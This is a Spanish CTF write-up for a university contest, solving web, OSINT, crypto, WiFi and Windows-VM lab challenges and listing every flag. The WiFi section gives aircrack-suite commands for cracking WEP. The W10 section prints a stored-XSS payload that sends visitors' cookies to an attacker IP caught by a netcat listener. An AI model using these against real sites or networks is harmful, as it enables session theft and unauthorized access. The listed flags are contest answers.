# Welcome

## Rules

En la página del CTF ir al apartado de rules  y hasta el final de esa página está la flag

![c54b75e81b7c5c139e233643fab197d8](https://user-images.githubusercontent.com/70277640/199337483-bf3d9e0b-eb00-4890-becb-04caab0ec8a5.png)

**flag{M1\_Pr1m3r4\_fl46}**

# Web

## HTML index

En la página principal del sitio del CTF abrimos las herramientas de desarrollador y en el inspector de código buscamos "flag". Encontramos la flag como un comentario dentro de un tag a

![b3898db6115ab22e6f602c58ee36c720](https://user-images.githubusercontent.com/70277640/199337526-76cfc4f2-5642-490c-8aa6-025369c39853.png)

**flag{h7ml_1nd3x}**

## U.S. Government

Navegamos a la página web oficial de la casa blanca en https://www.whitehouse.gov/ y en el código fuente en el primer comentario está un link que nos lleva a la página web del servicio digital de USA https://www.usds.gov/. Ya que estamos en esa página en el código fuente aparece el cangrejo del reto y su nombre

![30e236d500b31bae1f5e4e04b95fc880](https://user-images.githubusercontent.com/70277640/199337625-7575b4a4-7df2-43a0-b7b8-acc589c88ebc.png)

**flag{Mollie}**

# OSINT

## ITESO

Descargamos la imagen que está en la descripción del reto y la abrimos en metadata2go para encontrar el comentario que nos mencionaron

![ad430d57115f80ac7bff7f0f7f7bf3d4](https://user-images.githubusercontent.com/70277640/199337704-a440573e-0ed7-4f07-9edc-43f7fcf5abdf.png)

Copiamos esta cadena de texto y en cyberchef la decodificamos como base64 para encontrar la flag

![2ec3ea1b52f021bac84616039f9b011b](https://user-images.githubusercontent.com/70277640/199337732-a9c6c711-395d-4785-a587-6feab7176fe4.png)

**flag{the\_m3tadata\_1s_modified}**

## Pcap

Descargamos el archivo pcap de la descripción del reto y lo abrimos con wireshark. Al darle una revisada rápida vemos que hay tráfico de FTP. Filtramos la captura para ver el tráfico de FTP únicamente y vemos la contraseña que ingresaron para acceder

![3d903658322f1b8dfa120a26775d28c6](https://user-images.githubusercontent.com/70277640/199373049-280e3797-6730-4f91-aef2-87f9efb965d7.png)

**flag{ftp\_is\_better\_than\_dropbox}**

## Matryoshka

Descargamos la imagen que está en la descripción del reto y en kali usamos el comando strings sobre ese archivo para encontrar que información tiene la imagen

![6382d41315889506993b0f332a9d4eea](https://user-images.githubusercontent.com/70277640/199373127-734fbcd9-6ade-4e69-a802-7060f05e9e7b.png)

Vemos que hay un archivo matryoshka2.jpg dentro de la imagen que descargamos, por lo que usamos unzip para sacar esa imagen, lo cual nos da otra imagen. unzippeamos los archivos hasta que conseguimos un archivo de texto llamado flag.txt que contiene la flag

![4d5139dd222fada8830e7e6734a347cd](https://user-images.githubusercontent.com/70277640/199373146-84f1354d-50bd-4d58-b919-4146fd6dad37.png)

**flag{573g4n0gr4f14}**

# Crypto

## Crypto 1

Copiamos el texto cifrado y lo decodificamos como binario en cyberchef para obtener la flag

![2bab2d3862f8c725518bac5581712dee](https://user-images.githubusercontent.com/70277640/199373248-f0999d68-d430-426b-851e-2b46df09aeff.png)

**flag{un05\_Y\_c3r0s)**

## Crypto 2

Copiamos el texto cifrado y lo decodificamos como hexadecimal en cyberchef para obtener la flag

![84a0e9e17b215ce31209daf9e8798c4c](https://user-images.githubusercontent.com/70277640/199373336-5fbfb194-9afa-4a54-a39e-02b472eee824.png)

**flag{H3x4d3c1m4l}**

## Crypto 3

Copiamos el texto cifrado y usando el algoritmo de ROT13 lo decodificamos con cyberchef para obtener la flag

![e0befb9da45b8d6d28ca5cb2692827ca](https://user-images.githubusercontent.com/70277640/199373498-f7cde035-8e7d-46c0-b0b7-27b5194a82a9.png)

** flag{N0\_35\_L0\_m15m0\_c4354r\_c1ph3r\_qu3\_l1ttl3\_c4354r}**

## Hi Hittler!

Copiamos la bandera cifrada y en cyberchef utilizamos el modo enigma con las configuraciones especificadas en el reto para obtener la flag

![9c6fd97ca935588673e29a54017f1eb4](https://user-images.githubusercontent.com/70277640/199373558-d3697794-a779-47a2-837f-c65722e71214.png)

**FLAG{N0\_T0D0\_35\_CYB3R\_CH3F}**

## Decrypt

Descargamos el archivo .zip que está en la descripción del challenge y lo descomprimimos en la terminal de kali

![f5a782b9b5020f09d3ae255f1d043e5e](https://user-images.githubusercontent.com/70277640/199373630-e3750c80-3337-4b0e-9b5e-0e81eed187c5.png)

Al abrir el archivo ende.py con nano vemos dentro del código que nos explica cómo desencriptar un archivo. Para hacer esto necesitamos el archivo que queremos desencriptar y aunque no sabemos a este punto también necesitaremos la contraseña, pero esa también la tenemos dentro del archivo pw.txt

![b50d9c27592fc17a85e71aba647d1f50](https://user-images.githubusercontent.com/70277640/199373660-d0ee32a0-2047-4370-b3dd-e0d491b56306.png)

Ejecutamos el archivo ende.py con el archivo de texto a desencriptar y con la contraseña proporcionada y obtenemos la flag

![4a611a0cd705943cf596fb8e84f76aa4](https://user-images.githubusercontent.com/70277640/199373684-1f3c775a-9dbe-4868-b0a8-032ad463a8e1.png)

**flag{R34l_Crypt0}**

# Nueva categoría

## Felicidades

Al haber completado todos los retos anteriores se nos abrirá esta nueva categoría, junto con Real Hacking, Hacking WIFI y W10. Para obtener la flag basta con abrir la descripción del reto, ahí se nos mostrará la flag y también el link para descargar la máquina de Windows necesaria para hacer los retos de W10

![25212be617241ab115c403dfb6623ea5](https://user-images.githubusercontent.com/70277640/199373797-2f03d8f8-cf6e-4790-8745-1e2079ff9fc4.png)

**FLAG{CH3ckp01n7}**

# Hacking WIFI

## Borrador WEP

Para este reto era necesario ir al laboratorio T-205, o por lo menos estar cerca de él, y usar una antena de red que pudiera ponerse en modo monitor. En mi caso utilicé una antena TP-Link TL-WN722N. Una vez conectada la antena, la ponemos en modo monitor con los siguientes comandos (en mi caso la antena se llama wlan0, puede que el nombre cambie para ti)

![9d199689b0527ba43c90568bee9c8a3d](https://user-images.githubusercontent.com/70277640/199389965-7ff72efe-070f-4900-a2b1-409a61700787.png)

Una vez que está en modo monitor escaneamos las redes que hay para obtener el BSSID y el canal de la red ITESO_CTF con el comando `airodump-ng wlan0 --encrypt wep`. Ya que tenemos esas dos cosas podemos empezar a inyectar paquetes en la red con el comando `besside-ng wlan0 -c 8 -b E4:E1:30:64:66:7C`

![17917ec0ad0d7b57e608768cc8f530ed](https://user-images.githubusercontent.com/70277640/199390058-e98cec0d-8717-461c-8810-b8db8c556bfc.png)

Vemos que se inyectaron los paquetes suficientes para obtener la contraseña de la red. Usamos el comando `aircrack-ng ./wep.cap` para ver la contraseña en texto plano

![7ad81ff64241ebdb9457f6ccf9f56788](https://user-images.githubusercontent.com/70277640/199390192-c6c6be10-817b-4406-abb7-c01b8734e14a.png)

Accedemos a la red con la contraseña que acabamos de obtener y en un navegador web ingresamos la IP del gateway de la red, lo que nos mostrará una página para acceder a la administración del modem que nos pedirá una contraseña. Accedemos con la misma contraseña que accedimos a la red y vamos a la sección de servicios en donde encontraremos el borrador SMS y ahí encontraremos la flag del reto

![36c894e41eb9134a400a4c20466f8854](https://user-images.githubusercontent.com/70277640/199390239-bc57b527-6590-4057-86fc-b15935969d6d.png)

**FLAG{5M5\_D35d3\_M0d3m}**

# Real Hacking

## Hashes

Le damos click al link que está en la descripción del reto y nos redigirá a una página con un montón de hashes

![ad9a0703e5e5a3117fc07d34b36f9fe1](https://user-images.githubusercontent.com/70277640/199390297-2b312fae-0897-4b2f-a0ad-40aeb84cde75.png)

Para separar los hashes en diferentes lineas cree un pequeño programa en python que me los regresa ya separados en diferentes lineas. De esta forma puedo ir metiendo de 20 en 20 hashes en CrackStation

![4d04b56a4d269aa2477700c75f129aa2](https://user-images.githubusercontent.com/70277640/199390458-734d501a-f82d-4ea0-988b-cf6de541f315.png)
![c93fcb137ab1e120216c1f2e8b838e05](https://user-images.githubusercontent.com/70277640/199390509-be3eabcc-7c3a-4f26-beec-079f65c1252a.png)

Al ingresar los primeros 20 hashes vemos que cada hash es una letra de un mensaje que nos dejaron para el reto

![2ceaaadaeae56610f2c4e2b4df71c6d1](https://user-images.githubusercontent.com/70277640/199390617-ae04b3d9-746a-45b1-a00a-0841e1cea1f6.png)

Asumiendo que la flag está hasta el final del mensaje tomo los últimos 20 hashes y los meto en CrackStation

![a08ee78675b4a917c3a622ee10a33a6b](https://user-images.githubusercontent.com/70277640/199390692-32b53a5f-8837-4282-9c60-27cff3fc1ccd.png)

Ya que la flag no está completa meto unos cuantos hashes que están atrás de los últimos 20 que ingresé y obtengo la flag completa

![3e68acac059e1563a7bf541848a390af](https://user-images.githubusercontent.com/70277640/199390760-a82e8e4f-75ff-43ff-8d4a-2f4269888d42.png)

**flag{WELC0ME-T0-MEXICAN-H4SHES}**

## Ciphertext

Le damos click al link que está en la descripción del reto y nos redigirá a una página con el texto cifrado

![c91a5fd2444773689f0da4c43bf55a8c](https://user-images.githubusercontent.com/70277640/199390942-b0896d8a-73e6-40e3-b2b8-79830c86bd28.png)

Al leer la hint del reto vemos que es un criptograma. Buscamos un desencriptador de criptogramas online y metemos el texto del reto ahí para obtener la flag

![2407418019151400a2a67fcf1f148ec8](https://user-images.githubusercontent.com/70277640/199390995-3effb0ed-88d7-4cb9-8d25-81f950a35045.png)

**FLAGISARADARARDR**

## Kim Web

Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al revisar lo que había dentro del archivo comprimido encontramos lo siguiente

<img src=":/20c9fa009e3f4cc786b93caec7596578" alt="9f7288734e5eefc18700d1e4cc529b48.png" width="457" height="175" class="jop-noMdConv">

Al abrir el index.html en el navegador de Firefox vemos la página web de Kim. Si analizamos el código fuente de la página podemos ver que hay un tag de script que parece tener código ofuscado.

<img src=":/5b310873da394f6bac2efdbbc23e0237" alt="8004eb1800505cac01f6a6331193dfe1.png" width="698" height="335" class="jop-noMdConv">

Copiamos este código y lo pegamos en una herramienta en linea para darle formato a código sin formato de JS como js-beautify y ahí encontramos la flag

<img src=":/d9185cb6aae442d8954cde591cc1cf21" alt="afb960013a73c7d1361ccd53aed08ff9.png" width="764" height="287" class="jop-noMdConv">

**flag{Do\_You\_Know_??\_I\_4m\_Kim\_Anime\_Watcher\_And\_Web\_Applications_Hacker}**

## PyCode

Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al enlistar los archivos que estaban comprimidos encontramos uno con un nombre muy particular

<img src=":/bb5df4c38cf0412e9e4e16aba8543bef" alt="07ddd603b340860a96c40503b3c3f50e.png" width="415" height="275" class="jop-noMdConv">

Usando el comando strings sobre ese archivo encontramos un link de pastebin

<img src=":/5f375cda74e74ec0bee9054068ba22c0" alt="44d311234ee98b9c25e12d4b2b72a89e.png" width="262" height="192" class="jop-noMdConv">

Al navegar al link de pastebin encontramos un código de Python que tiene una cadena de texto que parece ser hexadecimal

![201cf26992e0d0fc7bbd7594ebd0d44c.png](:/8a4551b77cf04cf89296dc4a5d8c9b50)

Si llevamos esta cadena hexadecimal a cyberchef para decodificarla obtenemos la flag

<img src=":/1686a5c790f74e11a75a51f65486e11f" alt="95845c0dd4bf4e41209045e9cee540bf.png" width="497" height="283" class="jop-noMdConv">

**flag{1337_4l11111f3}**

# W10

Para realizar estos retos es necesario utilizar la VM que nos hicieron descargar. Una vez que la descargamos la VM y la importamos a VirtualBox, le subimos la RAM a 4 GB y le agregamos una interfaz Host-Only (esto es por gusto personal, para obtener la IP de la máquina de forma más rápida). Para poder escanear esta máquina con nuestra VM de Kali es necesario que la VM de Kali tenga una interfaz Host-Only también.

## index

En nuestra VM de Kali escaneamos la VM de Windows para ver qué puertos tiene abiertos

<img src=":/fcd989b6bb1d4fedb06ca5b05f0b434c" alt="634c62c8228d1bf4105531b47bdba06d.png" width="478" height="384" class="jop-noMdConv">

Al navegar a la IP de la VM de Windows en un navegador web podemos ver la página web que está montada en la máquina

<img src=":/70d211e2ac3b4d6fae8ed77cda0eccc5" alt="d367d8fceb3fca059a7283efb57b250e.png" width="614" height="313" class="jop-noMdConv">

Al revisar el robots.txt descubrimos que la página fue hecha utilizando WordPress (wp) y también descubrimos el nombre del sitio web que hostea la VM de Windows (esto lo necesitaremos para otro reto)

![432292d57d144e00a01fb07d00d4cc10.png](:/a5ef6cda000b461dac03484ae76356de)

Sabiendo que WordPress utiliza mayormente PHP y relacionando eso con el nombre del reto (index) podemos asumir que la página tiene un archivo index.php. al navegar a http://192.168.2.4/index.php encontramos una página que coincide con lo que se nos dice en la descripción del reto

<img src=":/5a3dec6f2aad4ac699db86852d395220" alt="f79eb1264aa270b9c93d757a81b674fe.png" width="405" height="159" class="jop-noMdConv">

Como ya hice la inyección de XSS a la página no me aparece el campo para ingresar texto, pero esta página originalmente lo que hace es que todo lo que introduzcamos al campo de texto y guardemos se reflejará en la página, aun cuando vayamos a otra ruta y volvamos a esta misma página. Sabiendo esto, podemos intentar hacer un Stored XSS con `<script> window.location='http://192.168.2.10/?c=' + document.cookie; </script>` para enviarnos la cookie de la página a un listener que levantaremos en Kali. Al revisar el código fuente de la página para ver si logramos inyectar el script podemos ver que esto funcionó y ahora cada vez que ingresamos a esta página se enviará la cookie a nuestra VM de Kali

<img src=":/0a7e065ecac14a63b7ed5def2fd7f71d" alt="d786b650098a667b63e600fd359f6cfe.png" width="480" height="472" class="jop-noMdConv">

Para poder recibir la cookie levantamos un listener en nuestra VM de Kali con `nc -lnvp 80` y volvemos a ingresar a la página de index.php en nuestro navegador para obtener la cookie, que a su vez contiene la flag

<img src=":/6eeec0f65abd4e5eb1833612050d3c7b" alt="0fead0b32457359a7ba4afa30352eefb.png" width="821" height="193" class="jop-noMdConv">

Ya lo único que necesitamos hacer es decodificar lo que está codificado como URL para obtener la flag

**FLAG{sanitize_input}**

## Commits

Como vimos en el robots.txt, encontramos el nombre de la página web

<img src=":/6964171c3c854a81872de83717d68c46" alt="cd068f2795d29b3f699dfdc8dfdf67b4.png" width="437" height="95">

Agregamos esta IP y el dominion a /etc/hosts para poder navegar a la página a través de Firefox

![269d7f5deed1c376ef0fd8999fe0948b.png](:/2b4bc2a50db84af19b794600ff11191d)

Una vez que hacemos esto podemos ver la página web que se está hosteando en la VM de Windows y al ir al final de la página podemos ver links a Facebook y a GitHub

<img src=":/15a412dd2f594ed89f6140bf6abb8e0d" alt="4fe11378db4156f54800d77b06446592.png" width="530" height="314">

Al presionar el link somos redireccionados a la página de GitHub del usuario GeoHome, que tiene un repositorio GeoAPI

<img src=":/57aacd9cab4d429d88982b1f96d69faf" alt="a6b0b5f586013132b115350738293b04.png" width="656" height="307">

Al entrar al repositorio y ver el historial de commits encontraremos un commit cuyo título es la flag de este reto

<img src=":/e6061db4027549dba8d4607113b7e279" alt="c3bd3768ab18b59bb8cc0d3e8763a2e1.png" width="759" height="269">

 **FLAG{ALWAYS\_CHECK\_COMMITS} **
